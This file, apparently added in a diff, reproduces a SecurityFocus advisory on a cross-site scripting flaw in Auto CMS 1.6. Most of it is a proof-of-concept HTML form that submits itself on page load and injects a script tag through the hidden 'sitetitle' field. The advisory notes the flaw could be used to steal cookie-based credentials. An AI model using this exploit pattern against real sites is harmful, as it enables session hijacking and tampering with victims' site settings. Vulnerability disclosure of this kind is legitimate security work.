@@ -1,0 +1,30 @@
+source: http://www.securityfocus.com/bid/42764/info
+
+Auto CMS is prone to a cross-site scripting vulnerability because the application fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+Auto CMS 1.6 is vulnerable; other versions may be affected. 
+
+<form action="http://www.example.com/index.php" method="post" name="main" enctype="multipart/form-data" >
+
+<input type="hidden" name="site_name" value="AutoCMS by Roberto Aleman" />
+<input type="hidden" name="site_url" value="index.php" />
+<input type="hidden" name="sitetitle" value=&#039;AutoCMS by Roberto Aleman"><script>alert("XSS")</script>&#039; />
+<input type="hidden" name="admin_email" value="admin@example.com" />
+<input type="hidden" name="admin_password" value="" />
+<input type="hidden" name="css_file" value="black.css" />
+<input type="hidden" name="index_name_link" value="Index" />
+<input type="hidden" name="about_name_link" value="About" />
+<input type="hidden" name="about_content" value="put about text here" />
+<input type="hidden" name="ps_name_link" value="" />
+<input type="hidden" name="ps_content" value="put producs and services text here" />
+<input type="hidden" name="news_name_link" value="News" />
+<input type="hidden" name="news_content" value="Title Example1: Text Example1/Title Example2: Text Example2/" />
+<input type="hidden" name="contact_name_link" value="Contact" />
+<input type="hidden" name="update" value="update" />
+
+</form>
+<script>
+document.main.submit();
+</script>
